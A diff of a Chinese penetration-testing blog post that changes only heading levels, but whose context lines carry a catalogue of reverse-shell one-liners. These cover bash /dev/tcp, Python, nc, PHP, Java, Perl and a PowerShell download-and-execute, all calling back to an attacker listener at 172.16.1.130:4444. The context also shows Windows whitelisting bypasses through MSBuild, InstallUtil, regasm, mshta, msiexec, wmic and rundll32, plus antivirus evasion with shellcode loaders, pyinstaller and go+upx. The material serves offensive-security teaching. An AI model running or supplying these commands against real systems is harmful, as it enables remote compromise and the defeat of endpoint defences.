@@ -1,11 +1,9 @@
 ---
 title: "渗透测试中弹shell的多种方式及bypass"
 date: 2019-07-19T09:24:46+08:00
-lastmod: 2019-07-19T09:24:46+08:00
 draft: false
 tags: ['shell']
 categories: ['渗透测试']
-comment: true
 ---
 
 弹shell的多种方式总结。
@@ -35,9 +33,9 @@ comment: true
 
 受害机：Centos 7 ：172.16.1.134
 
-# 常见姿势
+## 常见姿势
 
-## bash
+### bash
 
 bash也是最常见的一种方式
 
@@ -63,7 +61,7 @@ exec 5<>/dev/tcp/172.16.1.130/4444;cat <&5|while read line;do $line >&5 2>&1;don
 
 https://xz.aliyun.com/t/2549
 
-## python
+### python
 
 攻击机Kali还是监听
 
@@ -79,7 +77,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 这个payload是反向连接并且只支持Linux，Windows可以参考离别歌师傅的 [python windows正向连接后门](https://www.leavesongs.com/PYTHON/python-shell-backdoor.html)
 
-## nc
+### nc
 
 如果目标机器上有nc并且存在`-e`参数，那么可以建立一个反向shell
 
@@ -99,7 +97,7 @@ nc 172.16.1.130 4444 -t -e /bin/bash
 
 但是很多Linux的nc很多都是阉割版的，如果目标机器没有nc或者没有-e选项的话，不建议使用nc的方式
 
-## php
+### php
 
 攻击机监听
 
@@ -115,7 +113,7 @@ php -r '$sock=fsockopen("172.16.1.130",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 或者你直接在web目录写入一个php文件，然后浏览器去访问他就行了，这有一个[Linux和Windows两用的脚本](https://my.oschina.net/chinahermit/blog/144035)
 
-## Java 脚本反弹
+### Java 脚本反弹
 
 ```java
 r = Runtime.getRuntime()
@@ -123,12 +121,12 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/172.16.1.130/4444;cat <&5 | while
 p.waitFor()
 ```
 
-## perl 脚本反弹
+### perl 脚本反弹
 
 ```perl
 perl -e 'use Socket;$i="172.16.1.130";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
-## powershell
+### powershell
 
 目标机器执行
 
@@ -136,7 +134,7 @@ perl -e 'use Socket;$i="172.16.1.130";$p=4444;socket(S,PF_INET,SOCK_STREAM,getpr
 powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.130 -port 4444
 ```
 
-## msfvenom 获取反弹一句话
+### msfvenom 获取反弹一句话
 
 msf支持多种反弹方式，比如exe ps php asp aspx甚至是ruby等，我们可以用msfvenom来生成payload，然后在msf中监听，执行之后就会反弹回来session
 
@@ -176,11 +174,11 @@ exploit -j -z
 
 受害机：Win 7 ：172.16.1.135
 
-# Windows白加黑
+## Windows白加黑
 
 白加黑需要的payload可以使用[一句话下载姿势总结](https://y4er.com/post/download-shell/) 把payload下载到目标机器，这里不再赘述。
 
-## MSBuild
+### MSBuild
 
 > MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台
 >
@@ -243,7 +241,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319>MSBuild.exe "C:\Users\jack.0DAY\
 
 更多关于msbuild的内容可以参考[三好学生师傅的文章](https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/)
 
-## Installutil.exe&csc.exe
+### Installutil.exe&csc.exe
 
 > Installer工具是一个命令行实用程序，允许您通过执行指定程序集中的安装程序组件来安装和卸载服务器资源。此工具与System.Configuration.Install命名空间中的类一起使用。 
 >
@@ -275,7 +273,7 @@ C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToCo
 ```
 参考https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/
 
-## regasm和regsvcs
+### regasm和regsvcs
 
 regasm和regsvcs都可以用来反弹shell的，而且方式也一样
 
@@ -311,7 +309,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U 1.dll
 
 上线成功。
 
-## mshta
+### mshta
 
 mshta是在环境变量里的
 
@@ -335,7 +333,7 @@ mshta.exe http://baidu.com/shellcode.hta
 
 在cobalt strike中mshta也是一个很方便的上线功能。
 
-## Msiexec简介：
+### Msiexec简介：
 
 Msiexec 是 Windows Installer 的一部分。用于安装 Windows Installer 安装包（MSI）,一般在运行 Microsoft Update 安装更新或安装部分软件的时候出现，占用内存比较大。并且集成于 Windows 2003，Windows 7 等。
 
@@ -350,7 +348,7 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 ‐f m
 msiexec.exe /q /i http://172.16.1.130/shellcode.txt
 ```
 
-## wmic
+### wmic
 
 已经被添加到环境变量
 
@@ -375,7 +373,7 @@ version="1.0">
 参考:[利用wmic调用xsl文件的分析与利用](https://3gstudent.github.io/利用wmic调用xsl文件的分析与利用/)
 这里还有一个poc https://raw.githubusercontent.com/kmkz/Sources/master/wmic-poc.xsl
 
-## rundll32
+### rundll32
 
 Rundll32.exe是指“执行32位的DLL文件”。它的作用是执行DLL文件中的内部函数,功能就是以命令行的方式调用动态链接程序库。已经加入环境变量。
 
@@ -395,11 +393,11 @@ rundll32.exe shell32.dll,Control_RunDLL c:\Users\Y4er\Desktop\1.dll
 
 micro8前辈 https://micro8.gitbook.io/micro8/contents-1#71-80-ke
 
-# payload分离免杀
+## payload分离免杀
 
 在这里也只介绍两种分离免杀的姿势
 
-## shellcode loader
+### shellcode loader
 
 借助第三方加载器，将shellcode加载到内存中来执行。
 
@@ -417,15 +415,15 @@ shellcode_launcher.exe -i test.c
 
 msf监听正常上线
 
-## csc和InstallUtil
+### csc和InstallUtil
 
 不再赘述，参考上文白加黑
 
-# 偏僻语言
+## 偏僻语言
 
 实际上也不能说偏僻语言，原理是让杀软不识别文件的pe头。我们在这说两种
 
-## pyinstaller
+### pyinstaller
 
 py版的shellcode模板
 
@@ -436,7 +434,7 @@ py版的shellcode模板
 import ctypes
 
 def execute():
-    # Bind shell
+    ## Bind shell
     shellcode = bytearray(
     "\xbe\x24\x6e\x0c\x71\xda\xc8\xd9\x74\x24\xf4\x5b\x29"
         ...
@@ -480,7 +478,7 @@ pyinstaller.py -F --console 1.py
 
 和pyinstaller类似的还有py2exe，不再赘述。
 
-## go+upx
+### go+upx
 
 ```go
 package main
@@ -504,7 +502,7 @@ func main() {
 
 编译出来900多kb，在使用upx压缩一下会降低到200kb左右，也能正常上线。
 
-# 写在文后
+## 写在文后
 
 本文所讲到的很多姿势实际上是用来bypass applocker，不过也能弹回来会话。
 
